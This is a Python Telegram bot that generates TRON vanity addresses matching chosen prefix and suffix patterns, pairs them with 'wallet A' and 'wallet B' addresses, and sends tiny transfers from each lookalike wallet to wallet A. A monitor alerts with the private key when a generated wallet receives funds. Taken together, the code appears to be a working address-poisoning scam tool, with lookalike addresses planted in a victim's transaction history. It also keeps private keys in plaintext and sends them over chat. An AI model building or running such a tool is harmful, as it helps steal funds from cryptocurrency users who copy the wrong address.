import os
import sys
import time
import sqlite3
import logging
import requests
from datetime import datetime, timezone

# ============================================================
# LOGGING / STARTUP
# ============================================================

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
    stream=sys.stdout,
    force=True,
)
log = logging.getLogger("vanity-bot")

print("Starting Vanity & Transfer Executor Bot (with Approval)...", flush=True)

# --- CONFIGURATION ---
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
CHAT_ID = os.getenv("CHAT_ID", "")
PRIVATE_KEY = os.getenv("PRIVATE_KEY", "")
WALLET_C_PRIVATE_KEY = os.getenv("WALLET_C_PRIVATE_KEY", "")
TRONGRID_API_KEY = os.getenv("TRONGRID_API_KEY", "")

DATABASE_FILE = "vanity_executor.db"
GAS_COST_PER_TRANSFER = 1.1

TELEGRAM_URL = (
    f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"
    if TELEGRAM_BOT_TOKEN else ""
)

# Telegram bot identity, populated by check_telegram().
TELEGRAM_BOT_ID = None

# ============================================================
# DIAGNOSTICS
# ============================================================

def startup_diagnostics():
    log.info("========================================")
    log.info("Vanity Executor startup diagnostics")
    log.info("Python: %s", sys.version.split()[0])
    log.info("Working directory: %s", os.getcwd())
    log.info("Telegram token configured: %s", bool(TELEGRAM_BOT_TOKEN))
    log.info("Chat ID configured: %s", bool(CHAT_ID))
    log.info("Private key configured: %s", bool(PRIVATE_KEY))
    log.info("TronGrid API key configured: %s", bool(TRONGRID_API_KEY))
    log.info("Database: %s", os.path.abspath(DATABASE_FILE))
    log.info("========================================")

    missing = []
    if not TELEGRAM_BOT_TOKEN:
        missing.append("TELEGRAM_BOT_TOKEN")
    if not CHAT_ID:
        missing.append("CHAT_ID")
    if not PRIVATE_KEY:
        missing.append("PRIVATE_KEY")

    if missing:
        log.error("Missing required environment variables: %s", ", ".join(missing))
        raise RuntimeError("Required GitHub Actions secrets are missing.")

def check_telegram():
    """Verify the token and report webhook status without exposing the token."""
    log.info("Testing Telegram Bot API with getMe...")

    response = requests.get(
        f"{TELEGRAM_URL}/getMe",
        timeout=15
    )
    log.info("Telegram getMe HTTP status: %s", response.status_code)
    response.raise_for_status()

    data = response.json()

    if not data.get("ok"):
        log.error("Telegram getMe returned an error: %s", data)
        raise RuntimeError(data.get("description", "Telegram API error"))

    bot = data.get("result", {})

    global TELEGRAM_BOT_ID
    TELEGRAM_BOT_ID = bot.get("id")

    log.info(
        "Telegram authentication OK. Bot username: @%s | id: %s",
        bot.get("username", "unknown"),
        bot.get("id", "unknown"),
    )

    log.info("Checking Telegram webhook status...")
    response = requests.get(
        f"{TELEGRAM_URL}/getWebhookInfo",
        timeout=15
    )
    log.info("Telegram getWebhookInfo HTTP status: %s", response.status_code)
    response.raise_for_status()

    webhook_data = response.json()

    if not webhook_data.get("ok"):
        log.warning("Could not read webhook status: %s", webhook_data)
        return

    webhook = webhook_data.get("result", {})
    webhook_url = webhook.get("url", "")

    if webhook_url:
        log.warning(
            "Telegram webhook is configured. getUpdates polling may not work. "
            "Webhook URL is present (value intentionally not printed)."
        )
        log.warning(
            "Remove the webhook for polling with Telegram's deleteWebhook API "
            "before starting this bot."
        )
    else:
        log.info("Telegram webhook is not configured; long polling can be used.")

# ============================================================
# DATABASE SETUP
# ============================================================

try:
    db = sqlite3.connect(DATABASE_FILE, check_same_thread=False)
    db.row_factory = sqlite3.Row

    db.execute("""
    CREATE TABLE IF NOT EXISTS execution_queue (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        wallet_a TEXT NOT NULL,
        wallet_b TEXT NOT NULL,
        wallet_c_address TEXT,
        wallet_c_private_key TEXT,
        prefix_match INTEGER DEFAULT 0,
        suffix_match INTEGER DEFAULT 0,
        status TEXT DEFAULT 'pending_approval',
        tx1_hash TEXT,
        tx2_hash TEXT,
        last_trx_balance REAL DEFAULT 0.0,
        created_at TEXT
    )
    """)

    try:
        db.execute(
            "ALTER TABLE execution_queue "
            "ADD COLUMN last_trx_balance REAL DEFAULT 0.0"
        )
    except sqlite3.OperationalError:
        pass

    db.commit()
    log.info("SQLite database initialized successfully: %s", DATABASE_FILE)
except Exception:
    log.exception("Database initialization failed.")
    raise

def send_telegram(message):
    if not TELEGRAM_URL or not CHAT_ID:
        log.error("Telegram send skipped: token URL or CHAT_ID is missing.")
        return False

    try:
        response = requests.post(
            f"{TELEGRAM_URL}/sendMessage",
            json={
                "chat_id": CHAT_ID,
                "text": message,
                "parse_mode": "HTML",
                "disable_web_page_preview": True,
            },
            timeout=15,
        )

        log.info(
            "Telegram sendMessage HTTP status: %s",
            response.status_code
        )

        response.raise_for_status()
        data = response.json()

        if not data.get("ok"):
            log.error("Telegram sendMessage API error: %s", data)
            return False

        return True

    except Exception:
        log.exception("Telegram sendMessage failed.")
        return False

# ============================================================
# VANITY GENERATION
# ============================================================

def generate_vanity_wallet(prefix_target, suffix_target, max_attempts=100000):
    """
    Generate a TRON vanity address using explicit user-supplied patterns.

    The prefix and suffix are independent vanity patterns; they are not
    derived automatically from another wallet address.
    """
    prefix_target = prefix_target.strip()
    suffix_target = suffix_target.strip()

    log.info(
        "Generating vanity wallet: prefix=%s suffix=%s",
        prefix_target,
        suffix_target,
    )

    try:
        from tronpy.keys import PrivateKey
    except ImportError:
        log.exception("tronpy.keys.PrivateKey could not be imported.")
        return None, None, 0, 0

    best_addr, best_key, best_score = None, None, -1
    best_prefix, best_suffix = 0, 0

    for attempt in range(max_attempts):
        key = PrivateKey.random()
        addr = key.public_key.to_base58check_address()

        prefix_match = 0
        for i, expected in enumerate(prefix_target):
            if i < len(addr) and addr[i] == expected:
                prefix_match += 1
            else:
                break

        suffix_match = 0
        for i, expected in enumerate(reversed(suffix_target)):
            if i < len(addr) and addr[-1 - i] == expected:
                suffix_match += 1
            else:
                break

        total_score = prefix_match + suffix_match

        if total_score > best_score:
            best_score = total_score
            best_prefix = prefix_match
            best_suffix = suffix_match
            best_addr = addr
            best_key = key.hex()

        if (
            best_prefix == len(prefix_target)
            and best_suffix == len(suffix_target)
        ):
            log.info(
                "Exact vanity pattern found after %d attempts.",
                attempt + 1,
            )
            break

        if (attempt + 1) % 10000 == 0:
            log.info(
                "Vanity generation progress: %d/%d attempts; "
                "best score %d/%d",
                attempt + 1,
                max_attempts,
                best_score,
                len(prefix_target) + len(suffix_target),
            )

    log.info(
        "Generated Vanity: %d/%d prefix + %d/%d suffix = %d/%d",
        best_prefix,
        len(prefix_target),
        best_suffix,
        len(suffix_target),
        best_score,
        len(prefix_target) + len(suffix_target),
    )

    return best_addr, best_key, best_prefix, best_suffix

# ============================================================
# BACKGROUND MONITORING
# ============================================================

def monitor_vanity_wallets():
    try:
        rows = db.execute(
            "SELECT id, wallet_c_address, wallet_c_private_key, "
            "last_trx_balance FROM execution_queue "
            "WHERE wallet_c_address IS NOT NULL AND status = 'approved'"
        ).fetchall()

        headers = (
            {"TRON-PRO-API-KEY": TRONGRID_API_KEY}
            if TRONGRID_API_KEY else {}
        )

        log.info("Wallet monitor: checking %d approved wallet(s).", len(rows))

        for row in rows:
            try:
                r = requests.get(
                    f"https://api.trongrid.io/v1/accounts/"
                    f"{row['wallet_c_address']}",
                    params={"only_confirmed": "true"},
                    headers=headers,
                    timeout=10,
                )

                log.info(
                    "TronGrid account check for pair #%s: HTTP %s",
                    row["id"],
                    r.status_code,
                )

                r.raise_for_status()
                data = r.json()

                current_balance = (
                    int(data.get("data", [{}])[0].get("balance", 0))
                    / 1_000_000
                    if data.get("data")
                    else 0.0
                )

                if current_balance > row["last_trx_balance"] + 0.1:
                    send_telegram(
                        f"🚨 <b>ALERT: Generated Wallet Received Funds!</b>\n\n"
                        f"<b>Address:</b> "
                        f"<code>{row['wallet_c_address']}</code>\n"
                        f"<b>New TRX Balance:</b> "
                        f"{current_balance:.6f} TRX\n\n"
                        f"⚠️ <b>PRIVATE KEY:</b>\n"
                        f"<code>{row['wallet_c_private_key']}</code>\n\n"
                        f"<i>Save this key immediately!</i>"
                    )

                    db.execute(
                        "UPDATE execution_queue "
                        "SET last_trx_balance = ? WHERE id = ?",
                        (current_balance, row["id"]),
                    )
                    db.commit()

            except Exception:
                log.exception(
                    "Wallet monitoring failed for pair #%s.",
                    row["id"]
                )

    except Exception:
        log.exception("Wallet monitor query failed.")

# ============================================================
# TELEGRAM COMMANDS
# ============================================================

def cmd_add_pair(parts):
    log.info("Command received: add")

    if len(parts) < 5:
        send_telegram(
            "❌ Usage: <code>add [wallet_a] [wallet_b] "
            "[first_5_chars] [last_5_chars]</code>\n\n"
            "Example:\n"
            "<code>add T... A... TRONX 9ABCD</code>\n\n"
            "The first and last patterns should each be up to 5 "
            "characters."
        )
        return

    wallet_a = parts[1].strip()
    wallet_b = parts[2].strip()
    prefix_target = parts[3].strip()
    suffix_target = parts[4].strip()

    if not (1 <= len(prefix_target) <= 5):
        send_telegram("❌ First-character pattern must be 1–5 characters.")
        return

    if not (1 <= len(suffix_target) <= 5):
        send_telegram("❌ Last-character pattern must be 1–5 characters.")
        return

    send_telegram(
        f"⏳ <b>Generating Wallet C...</b>\n"
        f"First: <code>{prefix_target}</code>\n"
        f"Last: <code>{suffix_target}</code>"
    )

    addr_c, key_c, prefix, suffix = generate_vanity_wallet(
        prefix_target,
        suffix_target,
    )

    if not addr_c:
        send_telegram("❌ Failed to generate vanity wallet.")
        return

    now = datetime.now(timezone.utc).isoformat()

    cursor = db.execute("""
        INSERT INTO execution_queue
        (wallet_a, wallet_b, wallet_c_address, wallet_c_private_key,
         prefix_match, suffix_match, created_at, status)
        VALUES (?, ?, ?, ?, ?, ?, ?, 'pending_approval')
    """, (
        wallet_a,
        wallet_b,
        addr_c,
        key_c,
        prefix,
        suffix,
        now,
    ))

    db.commit()
    pair_id = cursor.lastrowid

    log.info(
        "Pair #%s generated. Prefix=%s/%s Suffix=%s/%s",
        pair_id,
        prefix,
        len(prefix_target),
        suffix,
        len(suffix_target),
    )

    exact = (
        prefix == len(prefix_target)
        and suffix == len(suffix_target)
    )

    status_text = (
        "✅ Exact pattern found."
        if exact
        else "⚠️ Best available match found within the attempt limit."
    )

    send_telegram(
        f"⏳ <b>Pair #{pair_id} Generated - PENDING YOUR APPROVAL</b>\n\n"
        f"🏦 <b>Wallet A:</b>\n<code>{wallet_a}</code>\n\n"
        f"👤 <b>Wallet B:</b>\n<code>{wallet_b}</code>\n\n"
        f"🎭 <b>Wallet C:</b>\n<code>{addr_c}</code>\n\n"
        f"🔑 <b>Private Key:</b>\n<code>{key_c}</code>\n\n"
        f"🎯 <b>Requested pattern:</b>\n"
        f"• First: <code>{prefix_target}</code>\n"
        f"• Last: <code>{suffix_target}</code>\n\n"
        f"📊 <b>Match:</b>\n"
        f"• Prefix: {prefix}/{len(prefix_target)}\n"
        f"• Suffix: {suffix}/{len(suffix_target)}\n"
        f"• Total: {prefix + suffix}/"
        f"{len(prefix_target) + len(suffix_target)}\n\n"
        f"{status_text}\n\n"
        f"<b>To approve:</b> <code>approve {pair_id}</code>\n"
        f"<i>Or type <code>reject {pair_id}</code> to delete it.</i>"
    )

def cmd_approve(parts):
    log.info("Command received: approve")

    if len(parts) < 2:
        send_telegram("❌ Usage: <code>approve [pair_id]</code>")
        return

    try:
        pair_id = int(parts[1])
    except ValueError:
        send_telegram("❌ Pair ID must be a number.")
        return

    row = db.execute(
        "SELECT * FROM execution_queue WHERE id = ?",
        (pair_id,)
    ).fetchone()

    if not row:
        send_telegram(f"❌ Pair #{pair_id} not found.")
        return

    if row["status"] != "pending_approval":
        send_telegram(
            f"❌ Pair #{pair_id} is not pending approval "
            f"(current status: {row['status']})."
        )
        return

    db.execute(
        "UPDATE execution_queue SET status = 'approved' WHERE id = ?",
        (pair_id,)
    )
    db.commit()

    log.info("Pair #%s approved.", pair_id)

    send_telegram(
        f"✅ <b>Pair #{pair_id} APPROVED!</b>\n\n"
        f"Wallet C is now ready for transfer.\n"
        f"Type <code>transfer</code> to execute all approved pairs."
    )

def cmd_reject(parts):
    log.info("Command received: reject")

    if len(parts) < 2:
        send_telegram("❌ Usage: <code>reject [pair_id]</code>")
        return

    try:
        pair_id = int(parts[1])
    except ValueError:
        send_telegram("❌ Pair ID must be a number.")
        return

    row = db.execute(
        "SELECT * FROM execution_queue WHERE id = ?",
        (pair_id,)
    ).fetchone()

    if not row:
        send_telegram(f"❌ Pair #{pair_id} not found.")
        return

    db.execute(
        "DELETE FROM execution_queue WHERE id = ?",
        (pair_id,)
    )
    db.commit()

    log.info("Pair #%s rejected and deleted.", pair_id)
    send_telegram(f"🗑️ <b>Pair #{pair_id} rejected and deleted.</b>")

def cmd_list():
    log.info("Command received: list")

    pending = db.execute(
        "SELECT * FROM execution_queue "
        "WHERE status = 'pending_approval' ORDER BY id DESC"
    ).fetchall()

    approved = db.execute(
        "SELECT * FROM execution_queue "
        "WHERE status = 'approved' ORDER BY id DESC"
    ).fetchall()

    msg = ""

    if pending:
        msg += f"⏳ <b>Pending Approval ({len(pending)})</b>\n\n"
        for row in pending:
            msg += (
                f"<b>#{row['id']}</b>\n"
                f"Wallet A: <code>{row['wallet_a'][:20]}...</code>\n"
                f"Wallet C: <code>{row['wallet_c_address'][:20]}...</code>\n"
                f"Score: {row['prefix_match']}/{row['suffix_match']} | "
                f"<i>Type <code>approve {row['id']}</code> to confirm</i>\n\n"
            )

    if approved:
        msg += f"\n✅ <b>Approved & Ready ({len(approved)})</b>\n\n"
        for row in approved:
            msg += (
                f"<b>#{row['id']}</b>\n"
                f"Wallet A: <code>{row['wallet_a'][:20]}...</code>\n"
                f"Wallet C: <code>{row['wallet_c_address'][:20]}...</code>\n"
                f"Score: {row['prefix_match']}/{row['suffix_match']}\n\n"
            )

    if not pending and not approved:
        msg = "📭 No pairs in queue."

    send_telegram(msg)

def cmd_cost():
    log.info("Command received: cost")

    count = db.execute(
        "SELECT COUNT(*) as count FROM execution_queue "
        "WHERE status = 'approved'"
    ).fetchone()["count"]

    if count == 0:
        send_telegram(
            "📭 No approved pairs to calculate cost for.\n\n"
            "Use <code>list</code> to see pending pairs and approve them first."
        )
        return

    total_trx = count * 2 * GAS_COST_PER_TRANSFER

    send_telegram(
        f"💰 <b>Estimated Cost</b>\n\n"
        f"Approved pairs: {count}\n"
        f"Transactions per pair: 2 (Main→C, C→A)\n"
        f"<b>Total: ~{total_trx:.2f} TRX</b>\n\n"
        f"<i>Ensure your Main Wallet has enough TRX.</i>"
    )

def cmd_transfer():
    """Preview the estimated cost. No transaction is broadcast here."""
    log.info("Command received: transfer (cost preview only)")

    rows = db.execute(
        "SELECT * FROM execution_queue "
        "WHERE status = 'approved' ORDER BY id"
    ).fetchall()

    if not rows:
        send_telegram(
            "❌ No approved pairs to transfer.\n\n"
            "Use <code>list</code> to see pairs and approve them first."
        )
        return

    count = len(rows)
    transfers_per_pair = 2
    estimated_per_pair = transfers_per_pair * GAS_COST_PER_TRANSFER
    total_estimated = count * estimated_per_pair

    send_telegram(
        f"💰 <b>Transfer Cost Preview</b>\n\n"
        f"Approved pairs: {count}\n"
        f"Transfers per pair: {transfers_per_pair} "
        f"(Main → C, C → A)\n"
        f"Estimated network cost per pair: ~{estimated_per_pair:.2f} TRX\n"
        f"<b>Estimated total: ~{total_estimated:.2f} TRX</b>\n\n"
        f"⚠️ This is an estimate; actual TRON resource usage can vary.\n\n"
        f"If you agree with this estimate, type "
        f"<code>/execute</code> to proceed.\n"
        f"<i>/transfer does not broadcast any transaction.</i>"
    )


def cmd_transact(parts):
    """Send 0.0001 TRX directly from the configured Wallet C to Wallet A.

    Wallet B is accepted as a reference/association address only. This command
    does not query the database and does not use the Main Wallet PRIVATE_KEY.
    """
    if len(parts) != 4:
        send_telegram(
            "❌ Usage: <code>/transact [wallet_a] [wallet_b] [wallet_c]</code>\n\n"
            "Sends <b>0.0001 TRX</b> directly from the Wallet C private key "
            "stored in <code>WALLET_C_PRIVATE_KEY</code> to Wallet A."
        )
        return

    wallet_a, wallet_b, wallet_c = (p.strip() for p in parts[1:4])

    try:
        from tronpy import Tron
        from tronpy.keys import PrivateKey

        if not WALLET_C_PRIVATE_KEY:
            raise ValueError(
                "GitHub Actions secret WALLET_C_PRIVATE_KEY is missing."
            )

        # Accept the normal 64-character hex private key, with an optional
        # 0x prefix or surrounding whitespace.
        clean_pk = WALLET_C_PRIVATE_KEY.strip()
        if clean_pk.lower().startswith("0x"):
            clean_pk = clean_pk[2:]
        clean_pk = clean_pk.replace(" ", "")

        if len(clean_pk) != 64:
            raise ValueError(
                "WALLET_C_PRIVATE_KEY must contain a 64-character hex private key."
            )

        try:
            c_priv = PrivateKey(bytes.fromhex(clean_pk))
        except ValueError as exc:
            raise ValueError(
                "WALLET_C_PRIVATE_KEY is not a valid hex private key."
            ) from exc

        tron = Tron()
        actual_c = c_priv.public_key.to_base58check_address()

        # Validate all supplied addresses before signing.
        for name, address in (
            ("Wallet A", wallet_a),
            ("Wallet B", wallet_b),
            ("Wallet C", wallet_c),
        ):
            try:
                tron.address.to_hex(address)
            except Exception as exc:
                raise ValueError(f"Invalid {name} address: {address}") from exc

        if actual_c != wallet_c:
            raise ValueError(
                "WALLET_C_PRIVATE_KEY does not match the supplied Wallet C address. "
                f"The key derives {actual_c}."
            )

        log.info(
            "Manual transact requested: Wallet C %s -> Wallet A %s; Wallet B %s is reference only.",
            actual_c,
            wallet_a,
            wallet_b,
        )

        # IMPORTANT: owner/sender is actual_c. PRIVATE_KEY (Main Wallet) is
        # deliberately not referenced anywhere in this command.
        tx = (
            tron.trx.transfer(actual_c, wallet_a, 100)
            .build()
            .sign(c_priv)
            .broadcast()
        )

        txid = tx["txid"] if isinstance(tx, dict) and "txid" in tx else tx.txid

        send_telegram(
            "✅ <b>TRANSACT SENT</b>\n\n"
            "💸 <b>Wallet C → Wallet A:</b> 0.0001 TRX\n"
            f"A: <code>{wallet_a}</code>\n"
            f"B (reference only): <code>{wallet_b}</code>\n"
            f"C: <code>{actual_c}</code>\n"
            f"TX: <code>{txid}</code>\n\n"
            f"<a href='https://tronscan.org/#/transaction/{txid}'>View transaction</a>"
        )

    except Exception as e:
        log.exception("Manual transact failed for supplied Wallet C %s.", wallet_c)
        send_telegram(
            f"❌ <b>TRANSACT FAILED</b>\n<code>{str(e)[:1000]}</code>"
        )


def cmd_execute():
    log.info("Command received: execute")

    rows = db.execute(
        "SELECT * FROM execution_queue "
        "WHERE status = 'approved' ORDER BY id"
    ).fetchall()

    if not rows:
        send_telegram(
            "❌ No approved pairs to transfer.\n\n"
            "Use <code>list</code> to see pairs and "
            "approve them first."
        )
        return

    send_telegram(
        f"🚀 <b>Starting Execution for {len(rows)} approved pairs...</b>"
    )

    try:
        from tronpy import Tron
        from tronpy.keys import PrivateKey
    except ImportError:
        log.exception("tronpy could not be imported.")
        send_telegram("❌ tronpy missing.")
        return

    try:
        clean_pk = PRIVATE_KEY.replace("0x", "").replace(" ", "")
        main_priv = PrivateKey(bytes.fromhex(clean_pk))
        tron = Tron()
        main_addr = main_priv.public_key.to_base58check_address()

        log.info("Main wallet private key loaded successfully.")
        log.info("Main wallet address derived successfully.")
    except Exception:
        log.exception("Failed to load Main Wallet.")
        send_telegram(
            "❌ Failed to load Main Wallet. "
            "See GitHub Actions logs for details."
        )
        return

    success_count = 0

    for row in rows:
        pair_id = row["id"]
        wallet_a = row["wallet_a"]
        wallet_c_addr = row["wallet_c_address"]
        wallet_c_pk = row["wallet_c_private_key"]

        try:
            log.info("Processing approved pair #%s.", pair_id)

            c_priv = PrivateKey(bytes.fromhex(wallet_c_pk))

            log.info("Broadcasting TX 1 for pair #%s.", pair_id)
            tx1 = (
                tron.trx.transfer(main_addr, wallet_c_addr, 1)
                .build()
                .sign(main_priv)
                .broadcast()
                .txid
            )

            log.info("TX 1 broadcast: %s", tx1)
            time.sleep(3)

            log.info("Broadcasting TX 2 for pair #%s.", pair_id)
            tx2 = (
                tron.trx.transfer(wallet_c_addr, wallet_a, 1)
                .build()
                .sign(c_priv)
                .broadcast()
                .txid
            )

            log.info("TX 2 broadcast: %s", tx2)

            db.execute(
                "UPDATE execution_queue "
                "SET status = 'completed', tx1_hash = ?, tx2_hash = ? "
                "WHERE id = ?",
                (tx1, tx2, pair_id),
            )
            db.commit()

            send_telegram(
                f"✅ <b>$0 Transfer Successful for Pair #{pair_id}!</b>\n\n"
                f"🎭 <b>Wallet C Used:</b>\n"
                f"<code>{wallet_c_addr}</code>\n\n"
                f"🔗 <b>TX 1 (Main → C):</b>\n"
                f"<code>{tx1}</code>\n"
                f"<b>TX 2 (C → A):</b>\n"
                f"<code>{tx2}</code>\n\n"
                f"<a href='https://tronscan.org/#/transaction/{tx1}'>"
                f"View TX 1</a>\n"
                f"<a href='https://tronscan.org/#/transaction/{tx2}'>"
                f"View TX 2</a>"
            )

            success_count += 1
            time.sleep(5)

        except Exception as e:
            log.exception("Pair #%s failed during transfer.", pair_id)
            send_telegram(
                f"❌ <b>Pair #{pair_id} Failed:</b>\n"
                f"<code>{str(e)[:1000]}</code>"
            )

    if success_count > 0:
        send_telegram(
            f"✅ <b>Execution Complete!</b>\n"
            f"Successfully processed {success_count} pairs."
        )

    db.execute(
        "DELETE FROM execution_queue WHERE status = 'completed'"
    )
    db.commit()

def handle_command(text):
    """
    Process only known bot commands.

    Plain text such as a generated wallet address must not be treated
    as a command just because its first characters happen to resemble
    a command name.
    """
    parts = text.strip().split()
    if not parts:
        return

    raw_cmd = parts[0]
    cmd = raw_cmd.lower().lstrip("/").split("@", 1)[0]

    allowed_commands = {
        "add",
        "approve",
        "reject",
        "list",
        "cost",
        "transfer",
        "execute",
        "transact",
        "help",
    }

    if cmd not in allowed_commands:
        log.info("Ignoring non-command Telegram message.")
        return

    log.info("Telegram command received: %s", cmd)

    if cmd == "add":
        cmd_add_pair(parts)
    elif cmd == "approve":
        cmd_approve(parts)
    elif cmd == "reject":
        cmd_reject(parts)
    elif cmd == "list":
        cmd_list()
    elif cmd == "cost":
        cmd_cost()
    elif cmd == "transfer":
        cmd_transfer()
    elif cmd == "execute":
        cmd_execute()
    elif cmd == "transact":
        cmd_transact(parts)
    elif cmd == "help":
        send_telegram(
            "<b>🤖 Vanity Executor Commands</b>\\n\\n"
            "<code>add [wallet_a] [wallet_b]</code> — "
            "Generate Wallet C (pending approval)\\n"
            "<code>approve [id]</code> — Approve a pair for transfer\\n"
            "<code>reject [id]</code> — Delete a pair\\n"
            "<code>list</code> — Show all pairs (pending & approved)\\n"
            "<code>cost</code> — Calculate TRX needed for approved pairs\\n"
            "<code>transfer</code> — Execute Main → C → A for approved pairs\\n"
            "<code>help</code> — Show this menu"
        )

# ============================================================
# MAIN LOOP
# ============================================================

def main():
    startup_diagnostics()
    check_telegram()

    if not send_telegram(
        "🚀 <b>Vanity Executor Bot Started (with Approval)</b>\n\n"
        "Pairs require approval before transfer.\n"
        "Type <code>help</code> for commands."
    ):
        log.error("Startup Telegram message could not be sent.")
        raise RuntimeError("Telegram startup message failed.")

    log.info("Startup message sent successfully.")
    log.info("Beginning Telegram long polling...")

    last_update_id = 0
    last_monitor_check = 0

    while True:
        current_time = time.time()

        try:
            response = requests.get(
                f"{TELEGRAM_URL}/getUpdates",
                params={
                    "offset": last_update_id + 1,
                    "timeout": 30,
                },
                timeout=35,
            )

            log.info(
                "Telegram getUpdates HTTP status: %s",
                response.status_code
            )

            response.raise_for_status()
            data = response.json()

            if not data.get("ok"):
                log.error("Telegram getUpdates API error: %s", data)
                time.sleep(5)
                continue

            updates = data.get("result", [])

            if updates:
                log.info("Received %d Telegram update(s).", len(updates))

            for update in updates:
                last_update_id = update["update_id"]

                message = update.get("message")

                if not message:
                    log.info(
                        "Update %s contained no message; skipping.",
                        update["update_id"]
                    )
                    continue

                chat_id = str(message.get("chat", {}).get("id", ""))
                text = message.get("text", "").strip()

                sender = message.get("from", {}) or {}
                sender_id = sender.get("id")

                # Normally Telegram does not deliver a bot's own messages
                # back through getUpdates, but explicitly guard against it
                # so an outgoing message can never become a command.
                if TELEGRAM_BOT_ID is not None and sender_id == TELEGRAM_BOT_ID:
                    log.info(
                        "Ignoring Telegram message originating from this bot."
                    )
                    continue

                log.info(
                    "Message received from configured chat: %s",
                    chat_id == str(CHAT_ID)
                )

                if chat_id != str(CHAT_ID):
                    log.warning("Ignoring message from unauthorized chat.")
                    continue

                if text:
                    handle_command(text)

        except requests.exceptions.Timeout:
            # A 30-second Telegram long-poll timeout is normal.
            log.info("Telegram long-poll timed out normally; polling again.")
        except requests.exceptions.RequestException:
            log.exception("Telegram HTTP polling error.")
            time.sleep(5)
        except Exception:
            log.exception("Unexpected error in main polling loop.")
            time.sleep(5)

        if current_time - last_monitor_check >= 60:
            monitor_vanity_wallets()
            last_monitor_check = current_time

        time.sleep(2)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        log.info("Bot stopped by user.")
    except Exception:
        log.exception("Fatal startup/runtime error.")
        raise
    finally:
        try:
            db.close()
        except Exception:
            pass
